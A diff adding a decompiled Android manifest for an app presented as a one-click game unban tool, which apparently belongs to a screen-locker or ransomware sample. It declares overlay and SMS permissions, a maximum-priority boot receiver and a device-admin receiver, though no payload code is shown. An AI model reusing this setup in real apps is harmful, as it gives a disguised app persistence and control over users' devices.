@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.h" platformBuildVersionCode="22" platformBuildVersionName="5.1.1-1819727">
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <application android:debuggable="false" android:icon="@drawable/APKTOOL_DUPLICATE_drawable_0x7f020006" android:label="球球一建解封✔" android:theme="@style/MT_Bin">
+        <activity android:label="@string/APKTOOL_DUPLICATE_string_0x7f080001" android:name=".M">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name="s"/>
+        <receiver android:name="bbb">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:description="@string/MT_Bin" android:name=".MyAdmin">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/MT_Bin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
